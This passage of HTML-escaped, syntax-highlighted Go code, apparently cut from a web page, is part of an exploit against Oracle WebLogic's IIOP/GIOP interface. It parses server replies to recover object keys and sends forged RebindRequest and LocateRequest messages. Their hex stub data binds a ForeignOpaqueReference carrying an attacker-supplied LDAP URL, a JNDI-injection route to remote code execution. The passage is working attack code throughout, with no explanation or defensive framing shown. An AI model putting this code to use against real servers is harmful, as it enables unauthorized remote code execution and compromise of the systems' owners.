punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>iOff<span class=\"token punctuation\">]</span>\n\n    tempPort <span class=\"token operator\">:=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">.</span>BigEndian<span class=\"token punctuation\">.</span><span class=\"token function\">Uint16</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> tempPort <span class=\"token operator\">!=</span> port <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    lt <span class=\"token operator\">:=</span> iOff <span class=\"token operator\">-</span> <span class=\"token number\">0x60</span>\n    fOff <span class=\"token operator\">:=</span> <span class=\"token number\">0x60</span> <span class=\"token operator\">+</span> lt <span class=\"token operator\">+</span> <span class=\"token number\">0x75</span>\n    <span class=\"token comment\" spellcheck=\"true\">// other cases</span>\n    <span class=\"token keyword\">for</span> buf<span class=\"token punctuation\">[</span>fOff<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x00</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        fOff<span class=\"token operator\">++</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\" spellcheck=\"true\">// Fake ObjectKey1</span>\n    <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>temp1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">[</span>fOff<span class=\"token punctuation\">:</span>fOff<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>temp2<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">[</span>fOff<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span>fOff<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\" spellcheck=\"true\">// Fake ObjectKey2</span>\n    <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>temp2<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span>\n    key1 <span class=\"token operator\">=</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">E</span><span class=\"token punctuation\">(</span>temp1<span class=\"token punctuation\">)</span>\n    key2 <span class=\"token operator\">=</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">E</span><span class=\"token punctuation\">(</span>temp2<span class=\"token punctuation\">)</span>\n\n    wlsKey1 <span class=\"token operator\">=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">ReplaceAll</span><span class=\"token punctuation\">(</span>wlsKey1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"{;{;key1};};\"</span><span class=\"token punctuation\">,</span> key1<span class=\"token punctuation\">)</span>\n\n    rebindAny <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>RebindRequest<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        Header<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>Header<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            Magic<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>GIOP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            MajorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MajorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MinorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MinorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageFlags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageType<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>RequestType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        RequestId<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        ResponseFlags<span class=\"token punctuation\">:</span>    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>WithTargetScope<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        TargetAddress<span class=\"token punctuation\">:</span>    giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>KeyAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        KeyAddress<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>wlsKey1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        RequestOperation<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>RebindAnyOp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        ServiceContextList<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ServiceContextList<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            SequenceLength<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            ServiceContext<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>giop<span class=\"token punctuation\">.</span>ServiceContext<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                ServiceContext0<span class=\"token punctuation\">,</span>\n                ServiceContext1<span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                    VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"06\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                    Data<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0000000000002849444c3a6f6d672e6f72672f53656e64696e67436\"</span> <span class=\"token operator\">+</span>\n                        <span class=\"token string\">\"f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000\"</span> <span class=\"token operator\">+</span>\n                        <span class=\"token string\">\"d3137322e32362e3131322e310000ec5b000000640042454108010300000000010000000000000\"</span> <span class=\"token operator\">+</span>\n                        <span class=\"token string\">\"0000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f646542617\"</span> <span class=\"token operator\">+</span>\n                        <span class=\"token string\">\"3653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdeb\"</span> <span class=\"token operator\">+</span>\n                        <span class=\"token string\">\"c0d227000000001000000010000002c00000000000100200000000300010020000100010501000\"</span> <span class=\"token operator\">+</span>\n                        <span class=\"token string\">\"10001010000000003000101000001010905010001\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                    VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                    Data<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00000000000000000000000000000100000000000000000100000000000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                    VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"424541\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"03\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                    Data<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00000000000000\"</span> <span class=\"token operator\">+</span> key2 <span class=\"token operator\">+</span> <span class=\"token string\">\"00000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                ServiceContext2<span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        StubData<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0000000000000001000000047465737400000001000000000000001d0000001c00000000000000010\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"412f57537472696e6756616c75653a312e300000000000\"</span> <span class=\"token operator\">+</span> ldap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    giop<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"RebindRequest\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>rebindAny<span class=\"token punctuation\">.</span><span class=\"token function\">Bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    buf <span class=\"token operator\">=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    startOff <span class=\"token operator\">:=</span> <span class=\"token number\">0x64</span> <span class=\"token operator\">+</span> lt <span class=\"token operator\">+</span> <span class=\"token number\">0xc0</span> <span class=\"token operator\">+</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token comment\" spellcheck=\"true\">// SendingContextRuntime</span>\n        <span class=\"token number\">0xac</span> <span class=\"token operator\">+</span> lt <span class=\"token operator\">+</span> <span class=\"token comment\" spellcheck=\"true\">// IOR ProfileHost ProfilePort</span>\n        <span class=\"token number\">0x5d</span> <span class=\"token comment\" spellcheck=\"true\">// ObjectKey Prefix</span>\n    <span class=\"token keyword\">for</span> buf<span class=\"token punctuation\">[</span>startOff<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x32</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> startOff <span class=\"token operator\">></span> <span class=\"token number\">0x2710</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\" spellcheck=\"true\">// InternalKey Offset</span>\n        startOff<span class=\"token operator\">++</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> startOff <span class=\"token operator\">></span> <span class=\"token number\">0x2710</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        key3 <span class=\"token operator\">=</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">E</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span><span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        key3 <span class=\"token operator\">=</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">E</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>startOff <span class=\"token punctuation\">:</span> startOff<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    wlsKey2 <span class=\"token operator\">=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">ReplaceAll</span><span class=\"token punctuation\">(</span>wlsKey2<span class=\"token punctuation\">,</span> <span class=\"token string\">\"{;{;key3};};\"</span><span class=\"token punctuation\">,</span> key3<span class=\"token punctuation\">)</span>\n    wlsKey2 <span class=\"token operator\">=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">ReplaceAll</span><span class=\"token punctuation\">(</span>wlsKey2<span class=\"token punctuation\">,</span> <span class=\"token string\">\"{;{;key1};};\"</span><span class=\"token punctuation\">,</span> key1<span class=\"token punctuation\">)</span>\n\n    rebindAnyTwice <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>RebindRequest<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        Header<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>Header<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            Magic<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>GIOP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            MajorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MajorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MinorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MinorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageFlags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageType<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>RequestType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        RequestId<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        ResponseFlags<span class=\"token punctuation\">:</span>    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>WithTargetScope<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        TargetAddress<span class=\"token punctuation\">:</span>    giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>KeyAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        KeyAddress<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>wlsKey2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        RequestOperation<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>RebindAnyOp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        ServiceContextList<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ServiceContextList<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            SequenceLength<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            ServiceContext<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>giop<span class=\"token punctuation\">.</span>ServiceContext<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                ServiceContext0<span class=\"token punctuation\">,</span>\n                ServiceContext1<span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                    VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"424541\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"03\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                    Data<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00000000000000\"</span> <span class=\"token operator\">+</span> key2 <span class=\"token operator\">+</span> <span class=\"token string\">\"00000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                ServiceContext2<span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        StubData<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00000001000000047465737400000001000000000000001d0000001c00000000000000010\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"412f57537472696e6756616c75653a312e300000000000\"</span> <span class=\"token operator\">+</span> ldap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    giop<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"RebindRequest\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>rebindAnyTwice<span class=\"token punctuation\">.</span><span class=\"token function\">Bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    buf <span class=\"token operator\">=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    locateRequest2 <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>LocateRequest<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        Header<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>Header<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            Magic<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>GIOP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            MajorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MajorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MinorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MinorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageFlags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageType<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>LocateRequestType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        RequestId<span class=\"token punctuation\">:</span>     giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        TargetAddress<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span 